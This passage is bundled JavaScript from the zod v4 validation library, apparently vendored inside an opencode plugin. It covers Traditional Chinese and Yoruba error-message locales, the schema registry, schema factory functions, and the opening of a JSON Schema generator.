    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u65E5\u671F\u6642\u9593",
    date: "ISO \u65E5\u671F",
    time: "ISO \u6642\u9593",
    duration: "ISO \u671F\u9593",
    ipv4: "IPv4 \u4F4D\u5740",
    ipv6: "IPv6 \u4F4D\u5740",
    cidrv4: "IPv4 \u7BC4\u570D",
    cidrv6: "IPv6 \u7BC4\u570D",
    base64: "base64 \u7DE8\u78BC\u5B57\u4E32",
    base64url: "base64url \u7DE8\u78BC\u5B57\u4E32",
    json_string: "JSON \u5B57\u4E32",
    e164: "E.164 \u6578\u503C",
    jwt: "JWT",
    template_literal: "\u8F38\u5165"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${issue3.expected}\uFF0C\u4F46\u6536\u5230 ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u7121\u6548\u7684\u9078\u9805\uFF1A\u9810\u671F\u70BA\u4EE5\u4E0B\u5176\u4E2D\u4E4B\u4E00 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue3.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u500B\u5143\u7D20"}`;
        return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue3.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue3.origin} \u61C9\u70BA ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue3.origin} \u61C9\u70BA ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.prefix}" \u958B\u982D`;
        }
        if (_issue.format === "ends_with")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.suffix}" \u7D50\u5C3E`;
        if (_issue.format === "includes")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u7B26\u5408\u683C\u5F0F ${_issue.pattern}`;
        return `\u7121\u6548\u7684 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u7121\u6548\u7684\u6578\u5B57\uFF1A\u5FC5\u9808\u70BA ${issue3.divisor} \u7684\u500D\u6578`;
      case "unrecognized_keys":
        return `\u7121\u6CD5\u8B58\u5225\u7684\u9375\u503C${issue3.keys.length > 1 ? "\u5011" : ""}\uFF1A${joinValues2(issue3.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue3.origin} \u4E2D\u6709\u7121\u6548\u7684\u9375\u503C`;
      case "invalid_union":
        return "\u7121\u6548\u7684\u8F38\u5165\u503C";
      case "invalid_element":
        return `${issue3.origin} \u4E2D\u6709\u7121\u6548\u7684\u503C`;
      default:
        return `\u7121\u6548\u7684\u8F38\u5165\u503C`;
    }
  };
};
function zh_TW_default2() {
  return {
    localeError: error90()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/yo.js
var error91 = () => {
  const Sizable = {
    string: { unit: "\xE0mi", verb: "n\xED" },
    file: { unit: "bytes", verb: "n\xED" },
    array: { unit: "nkan", verb: "n\xED" },
    set: { unit: "nkan", verb: "n\xED" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "n\u1ECD\u0301mb\xE0";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "akop\u1ECD";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9",
    email: "\xE0d\xEDr\u1EB9\u0301s\xEC \xECm\u1EB9\u0301l\xEC",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\xE0k\xF3k\xF2 ISO",
    date: "\u1ECDj\u1ECD\u0301 ISO",
    time: "\xE0k\xF3k\xF2 ISO",
    duration: "\xE0k\xF3k\xF2 t\xF3 p\xE9 ISO",
    ipv4: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv4",
    ipv6: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv6",
    cidrv4: "\xE0gb\xE8gb\xE8 IPv4",
    cidrv6: "\xE0gb\xE8gb\xE8 IPv6",
    base64: "\u1ECD\u0300r\u1ECD\u0300 t\xED a k\u1ECD\u0301 n\xED base64",
    base64url: "\u1ECD\u0300r\u1ECD\u0300 base64url",
    json_string: "\u1ECD\u0300r\u1ECD\u0300 JSON",
    e164: "n\u1ECD\u0301mb\xE0 E.164",
    jwt: "JWT",
    template_literal: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${issue3.expected}, \xE0m\u1ECD\u0300 a r\xED ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${stringifyPrimitive2(issue3.values[0])}`;
        return `\xC0\u1E63\xE0y\xE0n a\u1E63\xEC\u1E63e: yan \u1ECD\u0300kan l\xE1ra ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue3.origin ?? "iye"} ${sizing.verb} ${adj}${issue3.maximum} ${sizing.unit}`;
        return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue3.maximum}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum} ${sizing.unit}`;
        return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue3.minimum}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\u1EB9\u0300r\u1EB9\u0300 p\u1EB9\u0300l\xFA "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 par\xED p\u1EB9\u0300l\xFA "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 n\xED "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\xE1 \xE0p\u1EB9\u1EB9r\u1EB9 mu ${_issue.pattern}`;
        return `A\u1E63\xEC\u1E63e: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `N\u1ECD\u0301mb\xE0 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 j\u1EB9\u0301 \xE8y\xE0 p\xEDp\xEDn ti ${issue3.divisor}`;
      case "unrecognized_keys":
        return `B\u1ECDt\xECn\xEC \xE0\xECm\u1ECD\u0300: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `B\u1ECDt\xECn\xEC a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue3.origin}`;
      case "invalid_union":
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
      case "invalid_element":
        return `Iye a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue3.origin}`;
      default:
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
    }
  };
};
function yo_default2() {
  return {
    localeError: error91()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/registries.js
var $output2 = Symbol("ZodOutput");
var $input2 = Symbol("ZodInput");

class $ZodRegistry2 {
  constructor() {
    this._map = new WeakMap;
    this._idmap = new Map;
  }
  add(schema, ..._meta) {
    const meta3 = _meta[0];
    this._map.set(schema, meta3);
    if (meta3 && typeof meta3 === "object" && "id" in meta3) {
      if (this._idmap.has(meta3.id)) {
        throw new Error(`ID ${meta3.id} already exists in the registry`);
      }
      this._idmap.set(meta3.id, schema);
    }
    return this;
  }
  clear() {
    this._map = new WeakMap;
    this._idmap = new Map;
    return this;
  }
  remove(schema) {
    const meta3 = this._map.get(schema);
    if (meta3 && typeof meta3 === "object" && "id" in meta3) {
      this._idmap.delete(meta3.id);
    }
    this._map.delete(schema);
    return this;
  }
  get(schema) {
    const p = schema._zod.parent;
    if (p) {
      const pm = { ...this.get(p) ?? {} };
      delete pm.id;
      const f = { ...pm, ...this._map.get(schema) };
      return Object.keys(f).length ? f : undefined;
    }
    return this._map.get(schema);
  }
  has(schema) {
    return this._map.has(schema);
  }
}
function registry2() {
  return new $ZodRegistry2;
}
var globalRegistry2 = /* @__PURE__ */ registry2();
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/api.js
function _string2(Class3, params) {
  return new Class3({
    type: "string",
    ...normalizeParams2(params)
  });
}
function _coercedString2(Class3, params) {
  return new Class3({
    type: "string",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _email2(Class3, params) {
  return new Class3({
    type: "string",
    format: "email",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _guid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "guid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _uuid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _uuidv42(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v4",
    ...normalizeParams2(params)
  });
}
function _uuidv62(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v6",
    ...normalizeParams2(params)
  });
}
function _uuidv72(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v7",
    ...normalizeParams2(params)
  });
}
function _url2(Class3, params) {
  return new Class3({
    type: "string",
    format: "url",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _emoji4(Class3, params) {
  return new Class3({
    type: "string",
    format: "emoji",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _nanoid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "nanoid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cuid3(Class3, params) {
  return new Class3({
    type: "string",
    format: "cuid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cuid22(Class3, params) {
  return new Class3({
    type: "string",
    format: "cuid2",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ulid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "ulid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _xid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "xid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ksuid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "ksuid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ipv42(Class3, params) {
  return new Class3({
    type: "string",
    format: "ipv4",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ipv62(Class3, params) {
  return new Class3({
    type: "string",
    format: "ipv6",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cidrv42(Class3, params) {
  return new Class3({
    type: "string",
    format: "cidrv4",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cidrv62(Class3, params) {
  return new Class3({
    type: "string",
    format: "cidrv6",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _base642(Class3, params) {
  return new Class3({
    type: "string",
    format: "base64",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _base64url2(Class3, params) {
  return new Class3({
    type: "string",
    format: "base64url",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _e1642(Class3, params) {
  return new Class3({
    type: "string",
    format: "e164",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _jwt2(Class3, params) {
  return new Class3({
    type: "string",
    format: "jwt",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
var TimePrecision2 = {
  Any: null,
  Minute: -1,
  Second: 0,
  Millisecond: 3,
  Microsecond: 6
};
function _isoDateTime2(Class3, params) {
  return new Class3({
    type: "string",
    format: "datetime",
    check: "string_format",
    offset: false,
    local: false,
    precision: null,
    ...normalizeParams2(params)
  });
}
function _isoDate2(Class3, params) {
  return new Class3({
    type: "string",
    format: "date",
    check: "string_format",
    ...normalizeParams2(params)
  });
}
function _isoTime2(Class3, params) {
  return new Class3({
    type: "string",
    format: "time",
    check: "string_format",
    precision: null,
    ...normalizeParams2(params)
  });
}
function _isoDuration2(Class3, params) {
  return new Class3({
    type: "string",
    format: "duration",
    check: "string_format",
    ...normalizeParams2(params)
  });
}
function _number2(Class3, params) {
  return new Class3({
    type: "number",
    checks: [],
    ...normalizeParams2(params)
  });
}
function _coercedNumber2(Class3, params) {
  return new Class3({
    type: "number",
    coerce: true,
    checks: [],
    ...normalizeParams2(params)
  });
}
function _int2(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "safeint",
    ...normalizeParams2(params)
  });
}
function _float322(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float32",
    ...normalizeParams2(params)
  });
}
function _float642(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float64",
    ...normalizeParams2(params)
  });
}
function _int322(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "int32",
    ...normalizeParams2(params)
  });
}
function _uint322(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "uint32",
    ...normalizeParams2(params)
  });
}
function _boolean2(Class3, params) {
  return new Class3({
    type: "boolean",
    ...normalizeParams2(params)
  });
}
function _coercedBoolean2(Class3, params) {
  return new Class3({
    type: "boolean",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _bigint2(Class3, params) {
  return new Class3({
    type: "bigint",
    ...normalizeParams2(params)
  });
}
function _coercedBigint2(Class3, params) {
  return new Class3({
    type: "bigint",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _int642(Class3, params) {
  return new Class3({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "int64",
    ...normalizeParams2(params)
  });
}
function _uint642(Class3, params) {
  return new Class3({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "uint64",
    ...normalizeParams2(params)
  });
}
function _symbol2(Class3, params) {
  return new Class3({
    type: "symbol",
    ...normalizeParams2(params)
  });
}
function _undefined5(Class3, params) {
  return new Class3({
    type: "undefined",
    ...normalizeParams2(params)
  });
}
function _null5(Class3, params) {
  return new Class3({
    type: "null",
    ...normalizeParams2(params)
  });
}
function _any2(Class3) {
  return new Class3({
    type: "any"
  });
}
function _unknown2(Class3) {
  return new Class3({
    type: "unknown"
  });
}
function _never2(Class3, params) {
  return new Class3({
    type: "never",
    ...normalizeParams2(params)
  });
}
function _void3(Class3, params) {
  return new Class3({
    type: "void",
    ...normalizeParams2(params)
  });
}
function _date2(Class3, params) {
  return new Class3({
    type: "date",
    ...normalizeParams2(params)
  });
}
function _coercedDate2(Class3, params) {
  return new Class3({
    type: "date",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _nan2(Class3, params) {
  return new Class3({
    type: "nan",
    ...normalizeParams2(params)
  });
}
function _lt2(value, params) {
  return new $ZodCheckLessThan2({
    check: "less_than",
    ...normalizeParams2(params),
    value,
    inclusive: false
  });
}
function _lte2(value, params) {
  return new $ZodCheckLessThan2({
    check: "less_than",
    ...normalizeParams2(params),
    value,
    inclusive: true
  });
}
function _gt2(value, params) {
  return new $ZodCheckGreaterThan2({
    check: "greater_than",
    ...normalizeParams2(params),
    value,
    inclusive: false
  });
}
function _gte2(value, params) {
  return new $ZodCheckGreaterThan2({
    check: "greater_than",
    ...normalizeParams2(params),
    value,
    inclusive: true
  });
}
function _positive2(params) {
  return _gt2(0, params);
}
function _negative2(params) {
  return _lt2(0, params);
}
function _nonpositive2(params) {
  return _lte2(0, params);
}
function _nonnegative2(params) {
  return _gte2(0, params);
}
function _multipleOf2(value, params) {
  return new $ZodCheckMultipleOf2({
    check: "multiple_of",
    ...normalizeParams2(params),
    value
  });
}
function _maxSize2(maximum, params) {
  return new $ZodCheckMaxSize2({
    check: "max_size",
    ...normalizeParams2(params),
    maximum
  });
}
function _minSize2(minimum, params) {
  return new $ZodCheckMinSize2({
    check: "min_size",
    ...normalizeParams2(params),
    minimum
  });
}
function _size2(size, params) {
  return new $ZodCheckSizeEquals2({
    check: "size_equals",
    ...normalizeParams2(params),
    size
  });
}
function _maxLength2(maximum, params) {
  const ch = new $ZodCheckMaxLength2({
    check: "max_length",
    ...normalizeParams2(params),
    maximum
  });
  return ch;
}
function _minLength2(minimum, params) {
  return new $ZodCheckMinLength2({
    check: "min_length",
    ...normalizeParams2(params),
    minimum
  });
}
function _length2(length, params) {
  return new $ZodCheckLengthEquals2({
    check: "length_equals",
    ...normalizeParams2(params),
    length
  });
}
function _regex2(pattern, params) {
  return new $ZodCheckRegex2({
    check: "string_format",
    format: "regex",
    ...normalizeParams2(params),
    pattern
  });
}
function _lowercase2(params) {
  return new $ZodCheckLowerCase2({
    check: "string_format",
    format: "lowercase",
    ...normalizeParams2(params)
  });
}
function _uppercase2(params) {
  return new $ZodCheckUpperCase2({
    check: "string_format",
    format: "uppercase",
    ...normalizeParams2(params)
  });
}
function _includes2(includes, params) {
  return new $ZodCheckIncludes2({
    check: "string_format",
    format: "includes",
    ...normalizeParams2(params),
    includes
  });
}
function _startsWith2(prefix, params) {
  return new $ZodCheckStartsWith2({
    check: "string_format",
    format: "starts_with",
    ...normalizeParams2(params),
    prefix
  });
}
function _endsWith2(suffix, params) {
  return new $ZodCheckEndsWith2({
    check: "string_format",
    format: "ends_with",
    ...normalizeParams2(params),
    suffix
  });
}
function _property2(property, schema, params) {
  return new $ZodCheckProperty2({
    check: "property",
    property,
    schema,
    ...normalizeParams2(params)
  });
}
function _mime2(types, params) {
  return new $ZodCheckMimeType2({
    check: "mime_type",
    mime: types,
    ...normalizeParams2(params)
  });
}
function _overwrite2(tx) {
  return new $ZodCheckOverwrite2({
    check: "overwrite",
    tx
  });
}
function _normalize2(form) {
  return _overwrite2((input) => input.normalize(form));
}
function _trim2() {
  return _overwrite2((input) => input.trim());
}
function _toLowerCase2() {
  return _overwrite2((input) => input.toLowerCase());
}
function _toUpperCase2() {
  return _overwrite2((input) => input.toUpperCase());
}
function _array2(Class3, element, params) {
  return new Class3({
    type: "array",
    element,
    ...normalizeParams2(params)
  });
}
function _union2(Class3, options, params) {
  return new Class3({
    type: "union",
    options,
    ...normalizeParams2(params)
  });
}
function _discriminatedUnion2(Class3, discriminator, options, params) {
  return new Class3({
    type: "union",
    options,
    discriminator,
    ...normalizeParams2(params)
  });
}
function _intersection2(Class3, left, right) {
  return new Class3({
    type: "intersection",
    left,
    right
  });
}
function _tuple2(Class3, items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType2;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new Class3({
    type: "tuple",
    items,
    rest,
    ...normalizeParams2(params)
  });
}
function _record2(Class3, keyType, valueType, params) {
  return new Class3({
    type: "record",
    keyType,
    valueType,
    ...normalizeParams2(params)
  });
}
function _map2(Class3, keyType, valueType, params) {
  return new Class3({
    type: "map",
    keyType,
    valueType,
    ...normalizeParams2(params)
  });
}
function _set2(Class3, valueType, params) {
  return new Class3({
    type: "set",
    valueType,
    ...normalizeParams2(params)
  });
}
function _enum3(Class3, values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new Class3({
    type: "enum",
    entries,
    ...normalizeParams2(params)
  });
}
function _nativeEnum2(Class3, entries, params) {
  return new Class3({
    type: "enum",
    entries,
    ...normalizeParams2(params)
  });
}
function _literal2(Class3, value, params) {
  return new Class3({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...normalizeParams2(params)
  });
}
function _file2(Class3, params) {
  return new Class3({
    type: "file",
    ...normalizeParams2(params)
  });
}
function _transform2(Class3, fn) {
  return new Class3({
    type: "transform",
    transform: fn
  });
}
function _optional2(Class3, innerType) {
  return new Class3({
    type: "optional",
    innerType
  });
}
function _nullable2(Class3, innerType) {
  return new Class3({
    type: "nullable",
    innerType
  });
}
function _default3(Class3, innerType, defaultValue) {
  return new Class3({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : shallowClone2(defaultValue);
    }
  });
}
function _nonoptional2(Class3, innerType, params) {
  return new Class3({
    type: "nonoptional",
    innerType,
    ...normalizeParams2(params)
  });
}
function _success2(Class3, innerType) {
  return new Class3({
    type: "success",
    innerType
  });
}
function _catch3(Class3, innerType, catchValue) {
  return new Class3({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
function _pipe2(Class3, in_, out) {
  return new Class3({
    type: "pipe",
    in: in_,
    out
  });
}
function _readonly2(Class3, innerType) {
  return new Class3({
    type: "readonly",
    innerType
  });
}
function _templateLiteral2(Class3, parts, params) {
  return new Class3({
    type: "template_literal",
    parts,
    ...normalizeParams2(params)
  });
}
function _lazy2(Class3, getter) {
  return new Class3({
    type: "lazy",
    getter
  });
}
function _promise2(Class3, innerType) {
  return new Class3({
    type: "promise",
    innerType
  });
}
function _custom2(Class3, fn, _params) {
  const norm = normalizeParams2(_params);
  norm.abort ?? (norm.abort = true);
  const schema = new Class3({
    type: "custom",
    check: "custom",
    fn,
    ...norm
  });
  return schema;
}
function _refine2(Class3, fn, _params) {
  const schema = new Class3({
    type: "custom",
    check: "custom",
    fn,
    ...normalizeParams2(_params)
  });
  return schema;
}
function _superRefine2(fn) {
  const ch = _check2((payload) => {
    payload.addIssue = (issue3) => {
      if (typeof issue3 === "string") {
        payload.issues.push(issue2(issue3, payload.value, ch._zod.def));
      } else {
        const _issue = issue3;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = ch);
        _issue.continue ?? (_issue.continue = !ch._zod.def.abort);
        payload.issues.push(issue2(_issue));
      }
    };
    return fn(payload.value, payload);
  });
  return ch;
}
function _check2(fn, params) {
  const ch = new $ZodCheck2({
    check: "custom",
    ...normalizeParams2(params)
  });
  ch._zod.check = fn;
  return ch;
}
function _stringbool2(Classes, _params) {
  const params = normalizeParams2(_params);
  let truthyArray = params.truthy ?? ["true", "1", "yes", "on", "y", "enabled"];
  let falsyArray = params.falsy ?? ["false", "0", "no", "off", "n", "disabled"];
  if (params.case !== "sensitive") {
    truthyArray = truthyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
    falsyArray = falsyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
  }
  const truthySet = new Set(truthyArray);
  const falsySet = new Set(falsyArray);
  const _Codec = Classes.Codec ?? $ZodCodec2;
  const _Boolean = Classes.Boolean ?? $ZodBoolean2;
  const _String = Classes.String ?? $ZodString2;
  const stringSchema = new _String({ type: "string", error: params.error });
  const booleanSchema = new _Boolean({ type: "boolean", error: params.error });
  const codec2 = new _Codec({
    type: "pipe",
    in: stringSchema,
    out: booleanSchema,
    transform: (input, payload) => {
      let data = input;
      if (params.case !== "sensitive")
        data = data.toLowerCase();
      if (truthySet.has(data)) {
        return true;
      } else if (falsySet.has(data)) {
        return false;
      } else {
        payload.issues.push({
          code: "invalid_value",
          expected: "stringbool",
          values: [...truthySet, ...falsySet],
          input: payload.value,
          inst: codec2,
          continue: false
        });
        return {};
      }
    },
    reverseTransform: (input, _payload) => {
      if (input === true) {
        return truthyArray[0] || "true";
      } else {
        return falsyArray[0] || "false";
      }
    },
    error: params.error
  });
  return codec2;
}
function _stringFormat2(Class3, format, fnOrRegex, _params = {}) {
  const params = normalizeParams2(_params);
  const def = {
    ...normalizeParams2(_params),
    check: "string_format",
    type: "string",
    format,
    fn: typeof fnOrRegex === "function" ? fnOrRegex : (val) => fnOrRegex.test(val),
    ...params
  };
  if (fnOrRegex instanceof RegExp) {
    def.pattern = fnOrRegex;
  }
  const inst = new Class3(def);
  return inst;
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/to-json-schema.js
class JSONSchemaGenerator2 {
  constructor(params) {
    this.counter = 0;
    this.metadataRegistry = params?.metadata ?? globalRegistry2;
    this.target = params?.target ?? "draft-2020-12";
    this.unrepresentable = params?.unrepresentable ?? "throw";
    this.override = params?.override ?? (() => {});
    this.io = params?.io ?? "output";
    this.seen = new Map;
  }
  process(schema, _params = { path: [], schemaPath: [] }) {
    var _a2;
    const def = schema._zod.def;
    const formatMap2 = {
      guid: "uuid",
      url: "uri",
      datetime: "date-time",
      json_string: "json-string",
      regex: ""
    };
    const seen = this.seen.get(schema);
    if (seen) {
      seen.count++;
      const isCycle = _params.schemaPath.includes(schema);
      if (isCycle) {
        seen.cycle = _params.path;
      }
      return seen.schema;
    }
    const result = { schema: {}, count: 1, cycle: undefined, path: _params.path };
    this.seen.set(schema, result);
    const overrideSchema = schema._zod.toJSONSchema?.();
    if (overrideSchema) {
      result.schema = overrideSchema;
    } else {
      const params = {
        ..._params,
        schemaPath: [..._params.schemaPath, schema],
        path: _params.path
      };
      const parent = schema._zod.parent;
      if (parent) {
        result.ref = parent;
        this.process(parent, params);
        this.seen.get(parent).isParent = true;
      } else {
        const _json = result.schema;
        switch (def.type) {
          case "string": {
            const json2 = _json;
            json2.type = "string";
            const { minimum, maximum, format, patterns, contentEncoding } = schema._zod.bag;
            if (typeof minimum === "number")
              json2.minLength = minimum;
            if (typeof maximum === "number")
              json2.maxLength = maximum;
            if (format) {
              json2.format = formatMap2[format] ?? format;
              if (json2.format === "")
                delete json2.format;
            }
            if (contentEncoding)
              json2.contentEncoding = contentEncoding;
            if (patterns && patterns.size > 0) {
              const regexes = [...patterns];
              if (regexes.length === 1)
                json2.pattern = regexes[0].source;
              else if (regexes.length > 1) {
                result.schema.allOf = [
                  ...regexes.map((regex) => ({
                    ...this.target === "draft-7" || this.target === "draft-4" || this.target === "openapi-3.0" ? { type: "string" } : {},
                    pattern: regex.source
                  }))
                ];
              }
            }
            break;
          }
          case "number": {
            const json2 = _json;
            const { minimum, maximum, format, multipleOf, exclusiveMaximum, exclusiveMinimum } = schema._zod.bag;
            if (typeof format === "string" && format.includes("int"))
              json2.type = "integer";
            else
              json2.type = "number";
            if (typeof exclusiveMinimum === "number") {
              if (this.target === "draft-4" || this.target === "openapi-3.0") {
                json2.minimum = exclusiveMinimum;
                json2.exclusiveMinimum = true;
              } else {
                json2.exclusiveMinimum = exclusiveMinimum;
              }
            }
            if (typeof minimum === "number") {
              json2.minimum = minimum;
              if (typeof exclusiveMinimum === "number" && this.target !== "draft-4") {
                if (exclusiveMinimum >= minimum)
                  delete json2.minimum;
                else
                  delete json2.exclusiveMinimum;
              }
            }
            if (typeof exclusiveMaximum === "number") {
              if (this.target === "draft-4" || this.target === "openapi-3.0") {
                json2.maximum = exclusiveMaximum;
                json2.exclusiveMaximum = true;
              } else {
                json2.exclusiveMaximum = exclusiveMaximum;
              }
            }
            if (typeof maximum === "number") {
              json2.maximum = maximum;
              if (typeof exclusiveMaximum === "number" && this.target !== "draft-4") {
                if (exclusiveMaximum <= maximum)
                  delete json2.maximum;
                else
                  delete json2.exclusiveMaximum;
